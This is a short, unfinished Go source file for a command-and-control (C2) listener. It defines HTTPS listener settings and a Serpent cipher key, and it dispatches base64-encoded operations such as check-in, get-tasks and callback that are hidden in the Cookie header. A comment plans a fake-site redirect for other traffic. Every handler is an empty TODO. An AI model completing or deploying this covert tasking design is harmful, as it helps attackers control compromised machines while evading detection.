package c2

import "net/http"

/*
C2 struct

Type -> C2 listener type

Port -> C2 listener port

CertFile -> HTTPS C2 TLS certificate

KeyFile -> HTTPS C2 TLS key

Key -> Serpent cipher key
*/
type C2 struct {
	Type     string `defailt:"https"` // Reserved for future use...
	Port     string
	CertFile string
	KeyFile  string
	Key      []byte
}

func (c *C2) handler(w http.ResponseWriter, r *http.Request) {
	if op := r.Header.Get("Cookie"); op != "" {
		switch op {
		case "Q2hlY2tJbg==": // CheckIn
			// TODO: Add logic
		case "R2V0VGFza3M=": // GetTasks
			// TODO: Add logic
		case "Q2FsbEJhY2s=": // CallBack
			// TODO: Add logic
		default:
			// TODO: Redirect to fake site
			return
		}
	}
}

func (c *C2) Start() {
	switch c.Type {
	case "https":

	}
}
